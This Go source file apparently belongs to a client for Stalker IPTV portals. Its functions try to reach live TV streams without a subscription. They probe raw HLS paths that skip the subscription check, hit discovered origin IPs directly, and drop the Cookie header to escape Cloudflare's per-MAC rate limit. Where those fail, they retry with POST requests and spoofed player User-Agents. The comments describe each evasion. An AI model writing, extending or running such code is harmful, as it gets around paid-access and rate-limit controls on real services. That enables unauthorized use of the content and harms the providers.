package stalker

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// bypassClient is an HTTP client for direct stream access attempts (HLS
// endpoints, play/live.php, etc.) that bypass subscription checks. No
// keep-alives since these are one-shot probes against potentially many IPs.
var bypassClient = &http.Client{
	Timeout: 10 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
	Transport: &http.Transport{
		DisableKeepAlives: true,
	},
}

// hlsDirectPatterns are URL path patterns for HLS direct access, tried in
// order. Many Stalker portals serve HLS segments at raw paths that skip the
// subscription check entirely — the upstream stream server (nginx-rtmp, SRS)
// only cares whether the segment file exists, not who's asking.
var hlsDirectPatterns = []string{
	"/ch/%s.m3u8",
	"/ch/%s/index.m3u8",
	"/hls/%s.m3u8",
	"/stream/%s.m3u8",
	"/ch/%s.ts",
}

// tryBypass attempts all bypass methods in priority order and returns the
// first working stream URL. Called when create_link fails with a bypassable
// error (456 no subscription, 458 rate-limit, 403 forbidden).
func (c *Channel) tryBypass() (string, error) {
	base := c.Portal.originBase()
	if base == "" {
		return "", fmt.Errorf("no origin base URL available")
	}

	// Method 1: HLS Direct Endpoint — no auth needed, no rate limit.
	// The upstream stream server only checks if the segment exists.
	if link, err := c.tryDirectHLS(base); err == nil {
		return link, nil
	}

	// Method 2: play/live.php on origin with mac in query string.
	// Origin reads mac from query string, not Cookie. Cloudflare's
	// rate-limit bucket is keyed on the Cookie's mac value, so omitting
	// the Cookie puts us in a different (unlimited) bucket.
	streamID := extractStreamID(c.CMD)
	if streamID != "" {
		if link, err := c.tryPlayLiveOrigin(base, streamID); err == nil {
			return link, nil
		}
	}

	// Method 3: Cookie-less create_link on origin. Same request but
	// without the Cookie header — Cloudflare can't key its rate limit
	// on an empty cookie bucket.
	if link, err := c.tryCreateLinkNoCookie(); err == nil {
		return link, nil
	}

	// Method 4 & 5: try with POST / different User-Agent
	if link, err := c.tryCreateLinkPOST(); err == nil {
		return link, nil
	}

	return "", fmt.Errorf("all bypass methods failed for channel %s", c.Title)
}

// tryDirectHLS probes HLS paths that may skip subscription checks.
func (c *Channel) tryDirectHLS(base string) (string, error) {
	streamIDs := candidateStreamIDs(c)
	for _, sid := range streamIDs {
		for _, pattern := range hlsDirectPatterns {
			u := base + fmt.Sprintf(pattern, sid)
			req, _ := http.NewRequest("GET", u, nil)
			req.Header.Set("User-Agent", "VLC/3.0.18")
			resp, err := bypassClient.Do(req)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, _ := ioutil.ReadAll(resp.Body)
				resp.Body.Close()

				if len(body) > 0 && (strings.HasPrefix(string(body), "#EXTM3U") || len(body) > 100) {
					return u, nil
				}
				continue
			}
			resp.Body.Close()
		}
	}
	return "", fmt.Errorf("no direct HLS path found")
}

// tryPlayLiveOrigin calls play/live.php on the origin with mac in the query
// string and no Cookie header. The origin reads mac from the query, not the
// Cookie — Cloudflare's rate limit reads from the Cookie, so omitting it
// entirely bypasses the per-MAC rate limit bucket.
func (c *Channel) tryPlayLiveOrigin(base string, streamID string) (string, error) {
	u := fmt.Sprintf("%s/play/live.php?mac=%s&stream=%s&extension=ts",
		strings.TrimRight(base, "/"),
		url.QueryEscape(c.Portal.MAC),
		url.PathEscape(streamID))

	req, _ := http.NewRequest("GET", u, nil)
	resp, err := bypassClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" && strings.Contains(loc, "/live/play/") {
			return resolveURL(u, loc), nil
		}
	}
	return "", fmt.Errorf("play/live.php returned %d", resp.StatusCode)
}

// tryCreateLinkNoCookie sends create_link to the origin without the Cookie
// header. Cloudflare's 458 rate limit uses http.request.cookies["mac"] as
// the key — omitting the Cookie puts us in the empty-cookie-key bucket,
// which has its own separate (unused) rate limit.
func (c *Channel) tryCreateLinkNoCookie() (string, error) {
	link := c.Portal.Location + "?action=create_link&type=itv&cmd=" + url.PathEscape(c.CMD) + "&series=&forced_storage=&disable_ad=0&download=0&JsHttpRequest=1-xml"
	link = c.Portal.originURL(link)

	req, _ := http.NewRequest("GET", link, nil)
	req.Header.Set("User-Agent", c.Portal.UserAgent())
	req.Header.Set("X-User-Agent", "Model: "+c.Portal.Model+"; Link: Ethernet")
	req.Header.Set("Authorization", "Bearer "+c.Portal.Token)

	resp, err := bypassClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return "", &httpStatusError{link: link, status: resp.Status, code: resp.StatusCode}
	}

	body, _ := ioutil.ReadAll(resp.Body)
	return parseCreateLinkResponse(link, body)
}

// tryCreateLinkPOST sends create_link via POST with alternate User-Agent,
// probing header-based access control bypasses.
func (c *Channel) tryCreateLinkPOST() (string, error) {
	link := c.Portal.Location + "?action=create_link&type=itv&cmd=" + url.PathEscape(c.CMD) + "&series=&forced_storage=&disable_ad=0&download=0&JsHttpRequest=1-xml"
	link = c.Portal.originURL(link)

	userAgents := []string{
		"VLC/3.0.18",
		"ExoPlayer/2.18",
		"Mozilla/5.0 (QtEmbedded; U; Linux; C)",
	}

	for _, ua := range userAgents {
		req, _ := http.NewRequest("POST", link, nil)
		req.Header.Set("User-Agent", ua)
		req.Header.Set("Authorization", "Bearer "+c.Portal.Token)

		resp, err := bypassClient.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			body, _ := ioutil.ReadAll(resp.Body)
			if playURL, err := parseCreateLinkResponse(link, body); err == nil {
				return playURL, nil
			}
		}
	}

	return "", fmt.Errorf("POST create_link failed")
}

// --- Helpers --------------------------------------------------------------

// originBase returns the scheme + host portion of the portal URL, preferring
// a discovered origin IP when available.
func (p *Portal) originBase() string {
	if len(p.OriginIPs) > 0 {
		return "http://" + p.OriginIPs[0]
	}
	if p.Location == "" {
		return ""
	}
	parsed, err := url.Parse(p.Location)
	if err != nil {
		return ""
	}
	if parsed.Scheme == "" || parsed.Host == "" {
		return ""
	}
	return parsed.Scheme + "://" + parsed.Host
}

// candidateStreamIDs returns a list of possible stream IDs for a channel,
// tried in priority order.
func candidateStreamIDs(c *Channel) []string {
	var ids []string

	if c.CMD_ID != "" {
		ids = append(ids, c.CMD_ID)
	}
	if sid := extractStreamID(c.CMD); sid != "" {
		ids = append(ids, sid)
	}
	if c.CMD_CH_ID != "" {
		ids = append(ids, c.CMD_CH_ID)
	}
	return ids
}

// extractStreamID extracts a numeric stream ID from a channel CMD.
// The CMD can be just digits ("691399") or an ffmpeg command
// ("ffmpeg http://cdn/live/play/12345.m3u8").
func extractStreamID(cmd string) string {
	if cmd == "" {
		return ""
	}
	if isAllDigits(cmd) {
		return cmd
	}
	parts := strings.Split(cmd, " ")
	last := parts[len(parts)-1]
	last = strings.TrimPrefix(last, "ffmpeg ")
	last = strings.TrimPrefix(last, "http://")
	last = strings.TrimPrefix(last, "https://")

	segments := strings.Split(strings.TrimRight(last, "/"), "/")
	for i := len(segments) - 1; i >= 0; i-- {
		s := segments[i]
		s = strings.TrimSuffix(s, ".m3u8")
		s = strings.TrimSuffix(s, ".ts")
		if isAllDigits(s) {
			return s
		}
	}
	return ""
}

func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

// parseCreateLinkResponse extracts the play URL from a create_link JSON response.
func parseCreateLinkResponse(link string, body []byte) (string, error) {
	type tmpStruct struct {
		Js struct {
			Cmd   string `json:"cmd"`
			Error string `json:"error"`
		} `json:"js"`
	}
	var tmp tmpStruct
	if err := json.Unmarshal(body, &tmp); err != nil {
		return "", err
	}
	if tmp.Js.Error != "" {
		return "", fmt.Errorf("create_link failed: " + tmp.Js.Error)
	}
	if tmp.Js.Cmd == "" {
		return "", fmt.Errorf("create_link returned empty command")
	}
	strs := strings.Split(tmp.Js.Cmd, " ")
	return strs[len(strs)-1], nil
}

// resolveURL resolves a relative Location header against a request URL.
func resolveURL(base, loc string) string {
	if strings.HasPrefix(loc, "http://") || strings.HasPrefix(loc, "https://") {
		return loc
	}
	if strings.HasPrefix(loc, "/") {
		parts := strings.SplitN(base, "/", 4)
		if len(parts) >= 3 {
			return parts[0] + "//" + parts[2] + loc
		}
	}
	// Relative path: resolve against base directory
	idx := strings.LastIndex(base, "/")
	if idx >= 0 {
		return base[:idx+1] + loc
	}
	return base + "/" + loc
}
